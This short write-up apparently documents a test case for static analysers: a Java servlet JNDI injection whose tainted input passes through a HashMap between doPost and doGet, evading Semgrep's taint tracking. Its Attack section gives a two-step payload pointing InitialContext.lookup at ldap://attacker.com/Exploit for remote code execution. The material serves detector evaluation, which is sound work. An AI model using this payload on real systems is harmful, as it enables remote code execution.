# JNDI Injection via HashMap Aliasing

**CWE-74** | Injection

## Vulnerability

User input (`jndi_path` parameter) is stored in a `HashMap` via `doPost`. In `doGet`, the value is retrieved from the map and passed directly to `InitialContext.lookup()`. This enables JNDI injection leading to RCE via LDAP/RMI deserialization attacks.

## Why Semgrep Misses It

The tainted value flows through `HashMap.put()` then `HashMap.get()` — container aliasing. Semgrep's taint engine doesn't model Map semantics. It doesn't understand that `map.put(k, tainted)` followed by `map.get(k)` means the return value of `get` is tainted. The taint is "laundered" through the HashMap. Additionally, even if Semgrep tracked Map taint, the put/get happen in different HTTP methods (`doPost`/`doGet`), making this a cross-request flow similar to the stored injection pattern.

## Attack

1. `POST resource_name=evil&jndi_path=ldap://attacker.com/Exploit`
2. `GET resource_name=evil` triggers `ctx.lookup("ldap://attacker.com/Exploit")`
